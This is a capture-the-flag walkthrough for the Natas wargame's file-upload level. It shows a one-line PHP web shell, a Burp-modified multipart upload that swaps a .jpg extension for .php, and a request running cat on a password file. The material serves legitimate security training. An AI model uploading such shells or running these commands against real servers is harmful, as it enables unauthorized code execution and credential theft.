# Natas Level 11 → Level 12

**Goal:** Find the password for `natas13`. This level lets you upload a file (meant to be an image), but doesn't validate the file's actual content only trusts the `filename extension`, letting you upload a PHP shell.

### Step 1: Set up Burp Suite

- Open Burp Suite → go to Proxy tab → make sure Intercept is ON.

- Configure your browser to route traffic through Burp's proxy (usually 127.0.0.1:8080), or use Burp's built-in browser (Proxy → Intercept → Open Browser).

### Step 2: Log in to the level

In the Burp browser, go to:

http://natas12.natas.labs.overthewire.org

*Enter credentials when prompted:*

Username: natas12
Password: (from level 11)

### Step 3: Prepare a small PHP shell file

On your machine, create a file called `shell.php`:

```php
<?php system($_GET['cmd']); ?>
```

Keep it small, the server rejects files over 1000 bytes.

### Step 4: Use the upload form normally first

On the natas12 page, click "Choose File", select shell.php, and click Upload File but make sure Burp's Intercept is ON so the request pauses before it's sent.

### Step 5: Intercept and inspect the request

In Burp's Proxy → Intercept tab, you'll see a raw HTTP POST request like:

```
POST /index.php HTTP/1.1
Host: natas12.natas.labs.overthewire.org
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXXXX
...

------WebKitFormBoundaryXXXX
Content-Disposition: form-data; name="filename"

shell.jpg
------WebKitFormBoundaryXXXX
Content-Disposition: form-data; name="uploadedfile"; filename="shell.jpg"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------WebKitFormBoundaryXXXX
Content-Disposition: form-data; name="MAX_FILE_SIZE"

1000
------WebKitFormBoundaryXXXX--
```

### Step 6: Modify the request in Burp

Since the server trusts the filename field (both the POST field and the file's filename= attribute) to decide the saved extension, edit both instances of the filename in the raw request from `shell.jpg` to `shell.php`:

```
------WebKitFormBoundaryXXXX
Content-Disposition: form-data; name="filename"

shell.php
------WebKitFormBoundaryXXXX
Content-Disposition: form-data; name="uploadedfile"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------WebKitFormBoundaryXXXX
Content-Disposition: form-data; name="MAX_FILE_SIZE"

1000
------WebKitFormBoundaryXXXX--
```

You can edit this directly in Burp's Pretty/Raw request editor pane.

### Step 7: Forward the request

Click Forward (or Send) in Burp to let the modified request go through.

### Step 8: Turn off Intercept and check the response

Go to Proxy → HTTP History, find this request, and check the response. It should say something like:

File uploaded, path: <a href="upload/ab12cd34ef.php">upload/ab12cd34ef.php</a>

Copy that generated path.

### Step 9: Trigger the shell

In the browser (or a new Burp-proxied request via Repeater), visit:

http://natas12.natas.labs.overthewire.org/upload/ab12cd34ef.php?cmd=cat+/etc/natas_webpass/natas13

Tip: You can also do this directly in Burp:

- Right-click the upload response in HTTP History → Send to Repeater.
- In Repeater, create a new GET request to the uploaded path with the cmd parameter.
- Click Send and view the response on the right.

### Step 10: Get the password

The response body will contain the output of the command:

XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

*Lesson learned*

Burp Suite is useful here because it lets you intercept and freely edit multipart form-data requests including filenames and Content-Type headers that a browser's UI wouldn't normally let you change before upload. This is exactly how attackers bypass client-side-only validation: the browser might restrict file picker options, but the actual HTTP request can be crafted however the attacker wants once intercepted.